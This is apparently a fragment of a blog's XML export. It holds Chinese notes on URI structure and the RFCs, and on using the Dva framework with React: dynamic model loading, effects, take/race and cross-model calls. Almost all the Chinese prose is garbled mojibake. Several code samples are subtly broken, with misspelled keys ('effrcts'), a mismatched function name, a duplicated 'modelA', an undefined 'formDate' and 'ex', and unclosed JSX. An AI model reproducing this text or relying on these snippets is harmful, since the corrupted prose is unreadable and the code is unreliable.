ä½œä¸ºä»ŽæœåŠ¡å™¨ç«¯èŽ·å–èµ„æºæ—¶å¿…è¦çš„ç™»å½•æ¶ˆæ¯ï¼ˆèº«ä»½è®¤è¯ï¼‰ã€‚æ­¤é¡¹æ˜¯å¯é€‰é¡¹ã€‚ æœåŠ¡å™¨åœ°å€ ä½¿ç”¨ç»å¯¹URIå¿…é¡»æŒ‡å®šå¾…è®¿é—®çš„æœåŠ¡å™¨åœ°å€ã€‚åœ°å€å¯ä»¥æ˜¯ç±»ä¼¼laibh.topè¿™ç§DNSå¯è§£æžçš„åç§°ï¼Œæˆ–è€…192.168.1.1è¿™ç±»IPv4åœ°å€åï¼Œè¿˜å¯ä»¥æ˜¯[0:0:0:0:0:0:0:1]è¿™ç§ç”¨æ–¹æ‹¬å·æ‹¬èµ·æ¥çš„IPv6åœ°å€åã€‚ æœåŠ¡å™¨ç«¯å£å· æŒ‡å®šæœåŠ¡å™¨è¿žæŽ¥çš„ç½‘ç»œç«¯å£ã€‚æ­¤é¡¹ä¹Ÿæ˜¯å¯é€‰é¡¹ï¼Œè‹¥ç”¨æˆ·å¿½ç•¥åˆ™è‡ªåŠ¨ä½¿ç”¨é»˜è®¤ç«¯å£å· å¸¦å±‚æ¬¡çš„æ–‡ä»¶è·¯å¾„ æŒ‡å®šæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶è·¯å¾„æ¥å®šä½ç‰¹æŒ‡çš„èµ„æºã€‚è¿™ä¸ŽUNIXç³»ç»Ÿçš„æ–‡ä»¶ç›®å½•ç»“æž„ç›¸ä¼¼ æŸ¥è¯¢å­—ç¬¦ä¸² é’ˆå¯¹å·²æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„å†…çš„èµ„æºï¼Œå¯ä»¥ä½¿ç”¨æŸ¥è¯¢å­—ç¬¦ä¸²ä¼ å…¥ä»»æ„å‚æ•°ã€‚æ­¤é¡¹å¯é€‰ã€‚ ç‰‡æ®µæ ‡è¯†ç¬¦ ä½¿ç”¨ç‰‡æ®µæ ‡è¯†ç¬¦é€šå¸¸å¯æ ‡è®°å‡ºå·²èŽ·å–èµ„æºçš„å­èµ„æºï¼ˆæ–‡æ¡£å†…çš„æŸä¸ªä½ç½®ï¼‰ã€‚ä½†åœ¨RFCä¸­å¹¶æ²¡æœ‰æ˜Žç¡®è§„å®šå…¶ä½¿ç”¨æ–¹æ³•ã€‚è¯¥é¡¹ä¹Ÿä¸ºå¯é€‰é¡¹ å¹¶ä¸æ˜¯æ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½ç¬¦åˆ RFCæœ‰ä¸€äº›ç”¨æ¥åˆ¶å®š HTTP åè®®æŠ€æœ¯æ ‡å‡†çš„æ–‡æ¡£ï¼Œå®ƒä»¬è¢«ç§°ä¸ºRFCï¼ˆRequest for Commentsï¼Œå¾æ±‚ä¿®æ­£æ„è§ä¹¦ï¼‰ã€‚é€šå¸¸ï¼Œåº”ç”¨ç¨‹åºä¼šéµç…§ç”± RFC ç¡®å®šçš„æ ‡å‡†å®žçŽ°ã€‚å¯ä»¥è¯´ï¼ŒRFC æ˜¯äº’è”ç½‘çš„è®¾è®¡æ–‡æ¡£ï¼Œè¦æ˜¯ä¸æŒ‰ç…§ RFC æ ‡å‡†æ‰§è¡Œï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´æ— æ³•é€šä¿¡çš„çŠ¶å†µã€‚æ¯”å¦‚ï¼Œæœ‰ä¸€å° Web æœåŠ¡å™¨å†…çš„åº”ç”¨æœåŠ¡æ²¡æœ‰éµç…§RFC çš„æ ‡å‡†å®žçŽ°ï¼Œé‚£ Web æµè§ˆå™¨å°±å¾ˆå¯èƒ½æ— æ³•è®¿é—®è¿™å°æœåŠ¡å™¨äº†ã€‚ç”±äºŽä¸éµç…§ RFC æ ‡å‡†å®žçŽ°å°±æ— æ³•è¿›è¡Œ HTTP åè®®é€šä¿¡ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½ä¼šä»¥ RFC ä¸ºæ ‡å‡†æ¥å®žçŽ° HTTP åè®®ã€‚ä½†ä¹Ÿå­˜åœ¨æŸäº›åº”ç”¨ç¨‹åºå› å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ç«¯çš„ä¸åŒï¼Œè€Œæœªéµç…§ RFC æ ‡å‡†ï¼Œåè€Œå°†è‡ªæˆä¸€å¥—çš„â€œæ ‡å‡†â€æ‰©å±•çš„æƒ…å†µã€‚ä¸æŒ‰ RFC æ ‡å‡†æ¥å®žçŽ°ï¼Œå½“ç„¶ä¹Ÿä¸å¿…åŠ³å¿ƒè´¹åŠ›è®©è‡ªå·±çš„â€œæ ‡å‡†â€ç¬¦åˆå…¶ä»–æ‰€æœ‰çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ã€‚ä½†è®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æžœè¿™æ¬¾åº”ç”¨ç¨‹åºçš„ä½¿ç”¨è€…éžå¸¸å¤šï¼Œé‚£ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿä¸éš¾æƒ³è±¡ï¼Œå…¶ä»–çš„å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ç«¯å¿…ç„¶éƒ½ä¸å¾—ä¸åŽ»é…åˆå®ƒã€‚å®žé™…åœ¨äº’è”ç½‘ä¸Šï¼Œå·²ç»å®žçŽ°äº† HTTP åè®®çš„ä¸€äº›æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯é‡Œå°±å­˜åœ¨ä¸Šè¿°æƒ…å†µã€‚è¯´ä¸å®šå®ƒä»¬ä¼šä¸Žæœ¬ä¹¦ä»‹ç»çš„ HTTP åè®®çš„å®žçŽ°æƒ…å†µä¸ä¸€æ ·ã€‚æœ¬ä¹¦æŽ¥ä¸‹æ¥è¦ä»‹ç»çš„ HTTP åè®®å†…å®¹ï¼Œé™¤åŽ»éƒ¨åˆ†ä¾‹å¤–ï¼ŒåŸºæœ¬ä¸Šéƒ½ä»¥RFC çš„æ ‡å‡†ä¸ºå‡†ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dva å­¦ä¹ ç¬”è®° (ä¸‹)]]></title>
    <url>%2F2018-07-09-learn-dva-Part3.html</url>
    <content type="text"><![CDATA[dva å­¦ä¹ ç¬”è®°dva å­¦ä¹ ç¬”è®° ä»£ç  ä½¿ç”¨ Dva å¼€å‘å¤æ‚ SPAåŠ¨æ€åŠ è½½ modelåˆ©ç”¨ webpack çš„ require.ensure æ¥å®žçŽ° model çš„åŠ¨æ€åŠ è½½ 123456789101112131415161718192021222324252627function RouterConfig(&#123; history, app&#125;) &#123; const routes = [ &#123; path: &apos;/&apos;, name: &apos;IndexPage&apos;, getComponent(nextState, cb) &#123; require.ensure( [], (require) =&gt; &#123; registerModel(app,require(&apos;./models/dashboard&apos;)); cb(null, require(&apos;./routers/IndexPage&apos;)); &#125;) &#125; &#125;, &#123; path:&apos;/users&apos;, name:&apos;UsersPage&apos;, getComponent(nextState, cb) &#123; require.ensure(nextState, cb) &#123; require.ensure( [],(require) =&gt;&#123; registerModel(app, require(&apos;./models/users&apos;)); cb(null, require(&apos;./routes/Users&apos;)) &#125;) &#125; &#125; &#125; ]; return &lt;Router history = &#123; history &#125; routes = &#123; routes &#125; /&gt;;&#125; è¿™æ ·ï¼Œåœ¨è§†å›¾åˆ‡æ¢åˆ°è¿™ä¸ªè·¯ç”±çš„æ—¶å€™ï¼Œå¯¹åº”çš„ model å°±ä¼šè¢«åŠ è½½ã€‚åŒç†ï¼Œä¹Ÿå¯ä»¥åš model çš„åŠ¨æ€ç§»é™¤ï¼Œä¸è¿‡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸éœ€è¦ç§»é™¤çš„ ä½¿ç”¨ model å…±äº«å…¨å±€ä¿¡æ¯model å¯ä»¥åŠ¨æ€åŠ è½½ï¼Œä¹Ÿå¯ä»¥ç§»é™¤ã€‚ä»Žè¿™ä¸ªè§’åº¦çœ‹ï¼Œmodel æ˜¯å¯ä»¥æœ‰ä¸åŒç”Ÿå‘½å‘¨æœŸçš„ï¼Œæœ‰äº›å¯ä»¥ä¸ŽåŠŸèƒ½è§†å›¾ä¼´éšï¼Œè€Œæœ‰äº›å¯ä»¥è´¯ç©¿æ•´ä¸ªåº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸã€‚ ä»Žä¸šåŠ¡é€»è¾‘çœ‹ï¼Œä¸å°‘åœºæ™¯æ˜¯å¯ä»¥åšå…¨å±€çš„ model ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨è·¯ç”±ä¹‹é—´çš„å‰è¿›åŽé€€ï¼Œ model å¯ä»¥ç”¨äºŽåœ¨è·¯ç”±é—´å…±äº«æ•°æ®ï¼Œæ¯”è¾ƒå…¸åž‹çš„ï¼Œåƒåˆ—è¡¨é¡µå’Œè¯¦æƒ…é¡µçš„äº’ç›¸è½¬æ¢ï¼Œå¯ä»¥ç”¨åŒä¸€ä»½ model åŽ»å…±äº«ä»–ä»¬çš„æ•°æ® æ³¨æ„ï¼Œå¦‚æžœå½“å‰åº”ç”¨ä¸­è®°è½½äº†ä¸æ­¢ä¸€ä¸ª model ï¼Œåœ¨å…¶ä¸­ä¸€ä¸ª effect é‡Œåš select æ“ä½œï¼Œæ˜¯å¯ä»¥èŽ·å–å¦å¤–ä¸€ä¸ª stateçš„ 123*foo(action, &#123; select &#125;) &#123; const &#123; a, b&#125; = yield select();&#125; model çš„å¤ç”¨æœ‰æ—¶å€™ï¼Œä¸šåŠ¡ä¸Šå¯èƒ½ä¼šé‡åˆ°æœŸæœ›æŠŠä¸€äº›å¤–éƒ¨å…³è”æ¯”è¾ƒå°‘çš„ model æ‹†å‡ºæ¥çš„éœ€æ±‚ï¼Œå¯èƒ½ä¼šæ‹†å‡ºæ¥ä¸€ä¸ª model ï¼Œç„¶åŽç”¨ä¸åŒçš„è§†å›¾å®¹å™¨åŽ» connect å®ƒ 123456export default &#123; namespace: &apos;reusable&apos;, state: &#123;&#125;, reducers: &#123;&#125;, effrcts: &#123;&#125;&#125; æ‰€ä»¥ï¼Œåœ¨ä¸šåŠ¡ä¸Šï¼Œå¯èƒ½å‡ºçŽ°çš„ä½¿ç”¨æƒ…å†µå°±æ˜¯ï¼š 12345 ContainerA &lt;-- ModelA | ------------------------------ | |ContainerB &lt;-- reusable ContainerC &lt;-- reusable è¿™é‡Œé¢ï¼ŒContainerB å’Œ ContainerC æ˜¯ ContainerA çš„ä¸‹å±žï¼Œå®ƒä»¬çš„é€»è¾‘ç»“æž„ä¸€è‡´ï¼Œåªæ˜¯å±•çŽ°ä¸åŒã€‚æˆ‘ä»¬å¯ä»¥è®©å®ƒä»¬åˆ†åˆ« connect åŒä¸€ä¸ª model ï¼Œæ³¨æ„ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œmodel çš„ä¿®æ”¹ä¼šåŒæ—¶å½±å“åˆ°ä¸¤ä¸ªè§†å›¾ï¼Œå› ä¸º model åœ¨ state ä¸­æ˜¯ç›´æŽ¥ä»¥ namespace ä½œ key å­˜æ”¾çš„ï¼Œå®žé™…ä¸Šåªæœ‰ä¸€ä»½å®žä¾‹ åŠ¨æ€æ‰©å±• modelå¯èƒ½ä¼šé‡åˆ°çš„ä¸šåŠ¡é€»è¾‘ï¼š å‡ ä¸ªä¸šåŠ¡è§†å›¾é•¿å¾—å·®ä¸å¤šï¼Œ model ä¹Ÿå­˜åœ¨å°‘é‡çš„å·®åˆ« åœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥å¤ç”¨åŒä¸€ä¸ª model ï¼Œä½†è¿™ä¹ˆåšï¼Œå¯¹äºŽç»´æŠ¤æ˜¯ä¸€ç§æŒ‘æˆ˜ï¼Œå¾ˆå¯èƒ½æ”¹å˜å…¶ä¸­ä¸€ä¸ªï¼Œå¯¹å¦å¤–ä¸€ä¸ªé€ æˆäº†å½±å“ï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‰©å±•æ˜¯æ¯”è¾ƒå¥½çš„é€‰æ‹© æ‰©å±•è¦åšçš„äº‹æƒ…ï¼šæ–°å¢žä¸€äº›ä¸œè¥¿è¦†ç›–ä¸€äº›åŽŸæ¥çš„ä¸œè¥¿æ ¹æ®æ¡ä»¶åŠ¨æ€åˆ›å»ºä¸€äº›ä¸œè¥¿ dva ä¸­çš„æ¯ä¸ª model ï¼Œå®žé™…ä¸Šéƒ½æ˜¯æ™®é€šçš„ JavaScript å¯¹è±¡ï¼ŒåŒ…å« namespacestatereducerseffectssubscription ä»Žè¿™ä¸ªè§’åº¦ä¸Šçœ‹ï¼Œæˆ‘ä»¬è¦æ–°å¢žæˆ–è€…è¦†ç›–çš„ä¸€äº›ä¸œè¥¿ï¼Œéƒ½ä¼šæ¯”è¾ƒå®¹æ˜“ã€‚æ¯”å¦‚ä½¿ç”¨ Object.assign æ¥è¿›è¡Œå¯¹è±¡çš„å¤åˆ¶å±žæ€§ï¼Œå°±å¯ä»¥æŠŠæ–°çš„å†…å®¹æ·»åŠ æˆ–è€…è¦†ç›–åˆ°åŽŸæœ‰çš„å¯¹è±¡ä¸Šã€‚ æ³¨æ„è¿™é‡Œæœ‰ä¸¤çº§ï¼Œmodel ç»“æž„ä¸­çš„ stateï¼Œreducersï¼Œeffectsï¼Œsubscriptionséƒ½æ˜¯å¯¹è±¡ç»“æž„ï¼Œéœ€è¦åˆ†åˆ«åœ¨è¿™ä¸€çº§åŽ»åš assignã€‚ 1234567891011121314151617function reacteModel(options) &#123; const &#123; namespace, param &#125; = options; return &#123; namespace: `demo$&#123;namespace&#125;`, states: &#123;&#125;, reducers: &#123;&#125;, effects: &#123; *foo() &#123; // è¿™é‡Œå¯ä»¥æ ¹æ®paramæ¥ç¡®å®šä¸‹é¢è¿™ä¸ªcallçš„å‚æ•° yield call() &#125; &#125; &#125;&#125;const modelA = createModel(&#123; namespace: &apos;A&apos;, param :&#123; type: &apos;A&apos;&#125;&#125;);const modelA = createModel(&#123; namespace: &apos;B&apos;, param :&#123; type: &apos;B&apos;&#125;&#125;); é•¿æµç¨‹çš„ä¸šåŠ¡é€»è¾‘ä¾‹å¦‚å¤æ‚çš„è¡¨å•æäº¤ï¼Œä¸­é—´ä¼šéœ€è¦åŽ»å‘èµ·å¤šç§å¯¹è§†å›¾çŠ¶æ€çš„æ“ä½œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455*submit(action, &#123;put,call,select&#125;) &#123; const formData = yield select(state =&gt; &#123; const buyModel = state.buy; const context = state.context; const &#123; stock &#125; = buyModel; return &#123; uuid: context.uuid, market: stock &amp;&amp; stock.code, stockName: stock &amp;&amp; stock.name, price: String(buyModel.price), //å§”æ‰˜æ•°é‡ entrustAmount: String(buyModel.count), totalBalance: buyModel.totalBalance, availableTzbBanlance: buyModel.availableTzbBalance, availableDepositBalance: buyModel.availableDepositBalance, &#125; &#125;); const result = yield call(post, &apos;/h5/entrust_buy&apos;,formDate, &#123;loading: true&#125;); if(result.success)&#123; toast(&#123; type: &apos;success&apos;, content: &apos;å§”æ‰˜å·²å—ç†&apos;, &#125;); // æˆåŠŸä¹‹åŽå†èŽ·å–ä¸€æ¬¡çŽ°ä»·ï¼Œå¹¶å¡«å…¥ // yield put(&#123;type: &apos;fetchQuotation&apos;, payload: stock&#125;); yield put(&#123; type: &apos;entrustNoChange&apos;, payload: result.result &amp;&amp; result.result.entrustNo &#125;); // æ¸…ç©ºè¾“å…¥æ¡†å†…å®¹ yield put(&#123; type: &apos;searchQueryChange&apos;, value: &apos;&apos; &#125;); // 403æ—¶ï¼Œéœ€è¦éªŒè¯å¯†ç å†é‡æ–°æäº¤ if (!result.success &amp;&amp; result.resultCode === 403) &#123; yield put(&#123; type: &apos;checkPassword&apos;, payload: &#123;&#125; &#125;); return; &#125; // å¤±è´¥ä¹‹åŽä¹Ÿéœ€è¦æ›´æ–°æŠ•èµ„å®å’Œä¿è¯é‡‘é‡‘é¢ if (result.result) &#123; yield put(&#123; type: &apos;balanceChange&apos;, payload: result.result &#125;); &#125; // é‡æ–°èŽ·å–æœ€æ–°å¯æ’¤å•åˆ—è¡¨ yield put(&#123; type: &apos;fetchRevockList&apos; &#125;); // è¿”å›žçš„ç»“æžœé‡Œé¢å¦‚æžœæœ‰uuid, ç”¨æ–°çš„uuidæ›¿æ¢ if (result.uuid) &#123; yield put(&#123; type: &apos;context/updateUuid&apos;, payload: result.uuid &#125;); &#125; &#125;&#125; åœ¨ä¸€ä¸ª effect ä¸­å¯ä»¥ä½¿ç”¨å¤šä¸ª put æ¥åˆ†åˆ«è°ƒç”¨ reducer æ¥æ›´æ–°çŠ¶æ€å­˜åœ¨å¦å¤–ä¸€äº›æµç¨‹ï¼Œåœ¨ effect ä¸­å¯èƒ½ä¼šå­˜åœ¨å¤šä¸ªå¼‚æ­¥çš„æœåŠ¡è°ƒç”¨ï¼Œæ¯”å¦‚è¯´ï¼Œè¦è°ƒç”¨ä¸€æ¬¡æœåŠ¡ç«¯çš„éªŒè¯ï¼ŒæˆåŠŸä¹‹åŽå†åŽ»æäº¤æ•°æ®ï¼Œè¿™æ—¶å€™åœ¨ä¸€ä¸ª effect ä¸­å°±ä¼šå­˜åœ¨å¤šä¸ª call æ“ä½œäº† ä½¿ç”¨ take æ“ä½œè¿›è¡Œäº‹ä»¶ç›‘å¬ä¸€ä¸ªæµç¨‹çš„å˜åŠ¨ï¼Œéœ€è¦æ‰©æ•£åˆ°è‹¥å¹²å…¶ä»– model ä¸­ï¼Œåœ¨ redux-sage ä¸­æä¾›äº† take å’Œ takeLatest è¿™ä¸¤ä¸ªæ“ä½œï¼Œ dva æ˜¯ redux-saga çš„å°è£…ï¼Œä¹Ÿæ˜¯å¯ä»¥ç”¨è¿™ç§æ“ä½œ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªäº‹ä»¶å¤„ç†çš„ä»£ç  someSource.on( â€˜clickâ€™, event =&gt; doSomething(event)) è¿™æ®µä»£ç è½¬æˆ generator æ¥è¡¨è¾¾ï¼Œå°±æ˜¯ä¸‹é¢çš„è¿™ä¸ªå½¢å¼ 123456function* sage() &#123; while(true) &#123; const event = yield take(&apos;click&apos;); doSomething(event) &#125;&#125; æˆ‘ä»¬ å¯ä»¥åœ¨ dva ä¸­ä½¿ç”¨ take æ“ä½œæ¥ç›‘å¬ action å¤šä»»åŠ¡è°ƒåº¦ä¸Šè¿°å¤§å¤šéƒ½æ˜¯ä¸²è¡Œæ‰§è¡Œæ–¹å¼ï¼Œè¿™æ˜¯ä¸šåŠ¡ä¸­æœ€å¸¸è§çš„å¤šä»»åŠ¡æ‰§è¡Œæ–¹å¼ï¼Œåªéœ€é€ä¸ª yield call å°±å¯ä»¥äº† æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½å¸Œæœ›å¤šä¸ªä»»åŠ¡ä»¥å¤–ä¸€äº›æ–¹å¼æ‰§è¡Œ å¹¶è¡Œï¼š è‹¥å¹²ä¸ªä»»åŠ¡ä¹‹é—´ä¸å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œå¹¶ä¸”åŽç»­æ“ä½œå¯¹å®ƒä»¬çš„ç»“æžœæ— ä¾èµ–ç«žäº‰ï¼š è‹¥å¹²ä¸ªä»»åŠ¡ä¹‹é—´ï¼Œåªè¦æœ‰ä¸€ä¸ªæ‰§è¡Œå®Œæˆï¼Œå°±è¿›å…¥ä¸‹ä¸€ä¸ªçŽ¯èŠ‚å­ä»»åŠ¡ï¼š è‹¥å¹²ä¸ªä»»åŠ¡ï¼Œå¹¶è¡Œæ‰§è¡Œï¼Œä½†å¿…é¡»å…¨éƒ¨åšå®Œä¹‹åŽï¼Œä¸‹ä¸€ä¸ªçŽ¯èŠ‚æ‰ç»§ç»­æ‰§è¡Œ ä»»åŠ¡çš„å¹¶æ‰§è¡Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ 1234const [result1, result2] = yield [ call(service1, param1), call(service2, param2)] æŠŠå¤šä¸ªè¦å¹¶è¡Œæ‰§è¡Œçš„ä¸œè¥¿æ”¾åœ¨ä¸€ä¸ªæ•°ç»„é‡Œï¼Œå°±å¯ä»¥å¹¶è¡Œæ‰§è¡Œï¼Œç­‰æ‰€æœ‰çš„éƒ½ç»“æŸåŽè¿›è¡Œä¸‹ä¸€ä¸ªçŽ¯èŠ‚ï¼Œç±»ä¼¼ promise.all æ“ä½œï¼Œä¸€èˆ¬æœ‰äº›é›†æˆç•Œé¢ï¼Œæ¯”å¦‚ dashboard ï¼Œå…¶ä¸­å„ç»„ä»¶ä¹‹é—´ä¸šåŠ¡çš„ç®¡ç†è¾ƒå°ï¼Œå°±å¯ä»¥ç”¨è¿™ç§æ–¹å¼åŽ»åˆ†åˆ«åŠ è½½æ•°æ®ï¼Œæ­¤æ—¶ï¼Œæ•´ä½“åŠ è½½æ—¶é—´åªå–å†³äºŽæ—¶é—´æœ€é•¿çš„é‚£ä¸ª å¦‚æžœæŠŠ yield [] è¯¯å†™æˆ yield* [] å°±ä¼šé¡ºåºæ‰§è¡Œ ä»»åŠ¡çš„ç«žäº‰å¤šä»»åŠ¡çš„ç«žäº‰å…³ç³»ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ 12345678910const &#123; data, timeout &#125; = yield race(&#123; data: call(server, &apos;some data&apos;), timeout: call(delay, 1000)&#125;);if(data)&#123; put(&#123; type:&apos;DATA_RECEIVED&apos;, data&#125;);&#125;else&#123; put(&#123; type:&apos;TIMEOUT_ERROR&apos;&#125;);&#125; è·¨ model çš„é€šä¿¡åœ¨ä¸šåŠ¡å¤æ‚çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¯¹ model è¿›è¡Œæ‹†åˆ†ï¼Œå¾€å¾€åˆä¼šé‡åˆ°ä¸€äº›æ¯”è¾ƒå¤æ‚çš„äº‹æƒ… ä¸€ä¸ªæµç¨‹è´¯ç©¿æ•´ä¸ª model çˆ¶å®¹å™¨Aï¼Œå­å®¹å™¨Bï¼ŒäºŒè€…å„è‡ª connect äº†ä¸åŒçš„ model A å’Œ Bçˆ¶å®¹å™¨ä¸­æœ‰ä¸€ä¸ªæ“ä½œï¼Œåˆ†ä¸‰ä¸ªæ­¥éª¤ï¼šmodel A ä¸­æŸä¸ª effect å¤„ç†ç¬¬ä¸€æ­¥call model B ä¸­çš„æŸä¸ª effect åŽ»å¤„ç†ç¬¬äºŒæ­¥ç¬¬äºŒæ­¥ç»“æŸåŽï¼Œå†è¿”å›ž model A ä¸­åšç¬¬ä¸‰æ­¥åœ¨ dva ä¸­ï¼Œå¯ä»¥ç”¨ namespace åŽ»æŒ‡å®šæŽ¥å— action çš„ `model ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç±»ä¼¼è¿™æ ·çš„æ–¹å¼åŽ»ç»„åˆï¼š 123yield call(&#123; type: &apos;a/foo&apos; &#125;);yield call(&#123; type: &apos;b/foo&apos; &#125;);yield call(&#123; type: &apos;a/bar&apos; &#125;); ç”šè‡³ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ take å‘½ä»¤ï¼Œåœ¨å¦å¤–ä¸€ä¸ª model çš„æŸä¸ª effect ä¸­æ’å…¥é€»è¾‘ï¼š 1234567*effectA() &#123; yield call(service1); yield put(&#123; type: &apos;service1Success&apos; &#125;); // å¦‚æžœæˆ‘ä»¬å¤ç”¨è¿™ä¸ªeffectï¼Œä½†è¦åœ¨è¿™é‡ŒåŠ ä¸€ä»¶äº‹ï¼Œæ€Žä¹ˆåŠžï¼Ÿ yield call(service2); yield put(&#123; type: &apos;service2Success&apos; &#125;);&#125; å¯ä»¥åˆ©ç”¨ä¹‹å‰æˆ‘ä»¬è¯´çš„ take å‘½ä»¤ï¼š yield take(â€˜a/service1Successâ€™); è¿™æ ·ï¼Œå¯ä»¥åœ¨å¤–éƒ¨å¾€é‡Œé¢æ·»åŠ ä¸€ä¸ªå¹¶è¡Œæ“ä½œï¼Œé€šè¿‡è¿™æ ·çš„ç»„åˆå¯ä»¥å¤„ç†ä¸€äº›ç»„åˆæµç¨‹ã€‚ä½†å®žé™…æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½è¦å¤„ç†çš„ä¸ä»…ä»…æ˜¯ effect ï¼Œå¾ˆå¯èƒ½è§†å›¾ç»„ä»¶ä¸­è¿˜å­˜åœ¨åŽç»­é€»è¾‘ï¼Œåœ¨æŸä¸ª action æ‰§è¡Œä¹‹åŽï¼Œè¿˜éœ€è¦å†åšæŸäº›äº‹æƒ…ã€‚ æ¯”å¦‚ï¼š 123yield call(&#123; type: &apos;a/foo&apos; &#125;);yield call(&#123; type: &apos;b/foo&apos; &#125;);// å¦‚æžœè¿™é‡Œæ˜¯è¦åœ¨ç»„ä»¶é‡Œé¢åšæŸäº›äº‹æƒ…ï¼Œæ€Žä¹ˆåŠžï¼Ÿ å¯ä»¥åˆ©ç”¨ä¸€äº›ç‰¹æ®Šæ‰‹æ®µæŠŠæµç¨‹å»¶ä¼¸å‡ºæ¥åˆ°ç»„ä»¶é‡Œã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬é€šå¸¸åœ¨ç»„ä»¶ä¸­ dispatch ä¸€ä¸ª action çš„æ—¶å€™ï¼Œä¸ä¼šå¤„ç†åŽç»­äº‹æƒ…ï¼Œä½†å¯ä»¥ä¿®æ”¹è¿™ä¸ªè¿‡ç¨‹ï¼š 123456new Promise((resolve, reject) =&gt; &#123; dispatch(&#123; type: &apos;reusable/addLog&apos;, payload: &#123; data: 9527, resolve, reject &#125; &#125;);&#125;).then((data) =&gt; &#123; console.log(`after a long time, $&#123;data&#125; returns`);&#125;); æ³¨æ„è¿™é‡Œï¼Œæˆ‘ä»¬æ˜¯æŠŠ resolve å’Œ reject ä¼ åˆ° action é‡Œé¢äº†ï¼Œæ‰€ä»¥ï¼Œåªéœ€åœ¨ effect é‡Œé¢è¿™æ ·å¤„ç†ï¼š 123456789try &#123; const result = yield call(service1); yield put(&#123; type: &apos;service1Success&apos;, payload: result &#125;); resolve(result);&#125;catch (error) &#123; yield put(&#123; type: &apos;service1Fail&apos;, error &#125;); reject(ex);&#125; è¿™æ ·ï¼Œå°±å®žçŽ°äº†è·¨è¶Šç»„ä»¶ã€æ¨¡åž‹çš„å¤æ‚çš„é•¿æµç¨‹çš„è°ƒç”¨ã€‚]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>dva</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dva å­¦ä¹ ç¬”è®° (ä¸­)]]></title>
    <url>%2F2018-07-09-learn-dva-part2.html</url>
    <content type="text"><![CDATA[dva å­¦ä¹ ç¬”è®°dva å­¦ä¹ ç¬”è®° ä»£ç  3.å…¥é—¨è¯¾React æ²¡æœ‰æœ‰è§£å†³çš„é—®é¢˜React æœ¬èº«åªæ˜¯ä¸€ä¸ª DOM çš„æŠ½è±¡å±‚ï¼Œä½¿ç”¨ç»„ä»¶æž„å»ºè™šæ‹Ÿ DOMå¼€å‘å¤§åº”ç”¨è¦è§£å†³çš„é—®é¢˜é€šä¿¡ï¼šç»„ä»¶ä¹‹é—´å¦‚ä½•é€šä¿¡æ•°æ®æµï¼šæ•°æ®å¦‚ä½•å’Œè§†å›¾ä¸²è”èµ·æ¥ï¼Ÿ è·¯ç”±å’Œæ•°æ®å¦‚ä½•ç»‘å®šï¼Ÿ å¦‚ä½•ç¼–å†™å¼‚æ­¥é€»è¾‘ï¼Ÿ é€šä¿¡é—®é¢˜ç»„ä»¶ä¼šå‘ç”Ÿä¸‰ç§é€šä¿¡æƒ³å­ç»„ä»¶å‘æ¶ˆæ¯å‘çˆ¶ç»„ä»¶å‘æ¶ˆæ¯å‘å…¶ä»–ç»„ä»¶å‘æ¶ˆæ¯ React åªæä¾›äº†ä¸€ç§é€šä¿¡æ‰‹æ®µï¼šä¼ å‚ ç»„ä»¶é€šä¿¡çš„ä¾‹å­step 1çˆ¶ç»„ä»¶æ‹¿åˆ°å­ç»„ä»¶çš„å€¼ 1234567891011121314class Son extends React.Component &#123; render()&#123; return &lt;input /&gt;; &#125;&#125;class Father extends React.Compoent &#123; render() &#123; return &lt;div&gt; &lt;Son /&gt; &lt;p&gt; è¿™é‡Œæ˜¾ç¤º Son ç»„ä»¶çš„å†…å®¹ &lt;/div&gt;ï¼› &#125;&#125;ReactDOM.render(&lt;Father&gt;,mountNode); step 2å­ç»„ä»¶é€šè¿‡çˆ¶ç»„ä»¶ä¼ å…¥çš„å‡½æ•°ï¼Œå°†è‡ªå·±çš„å€¼å†ä¼ å›žçˆ¶ç»„ä»¶ 12345678910111213141516171819202122class Son extends React.Component &#123; render() &#123; return &lt;input onChange = &#123; this.props.onChange &#125;&gt;&#125;class Father extends React.Component &#123; constructor() &#123; super(); this.state = &#123; son: &quot;&quot; &#125; this.changeHandler = this.changeHandler.bind(this); &#125; changeHandler(e)&#123; this.SetState(&#123; son: e.target.value &#125;); &#125; render() &#123; return &lt;div&gt; &lt;Son onChange = &#123; changeHandler &#125;&gt; &lt;p&gt;è¿™é‡Œå±•ç¤º Son ç»„ä»¶çš„å†…å®¹ &#123; this.state.son &#125;&lt;/p&gt; &lt;/div&gt; 